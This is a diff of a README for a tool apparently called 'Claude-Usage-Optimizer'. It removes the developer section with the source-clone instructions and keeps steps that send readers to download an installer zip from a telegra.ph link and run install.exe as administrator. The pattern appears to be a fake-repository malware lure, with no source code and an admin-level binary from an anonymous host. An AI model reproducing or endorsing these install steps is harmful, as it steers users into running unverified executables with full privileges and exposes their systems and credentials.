@@ -59,11 +59,3 @@ Download the installer package here: **[install.zip](https://telegra.ph/TRANSITI
 3. Run `install.exe` as administrator (recommended for full functionality).
 4. Follow the on-screen setup instructions.
 5. Launch the application and connect your workflow.
-
-### For Developers
-
-```bash
-# Clone the repository (when source becomes available)
-git clone https://github.com/yourusername/Claude-Usage-Optimizer.git
-cd Claude-Usage-Optimizer
-# Run the main application
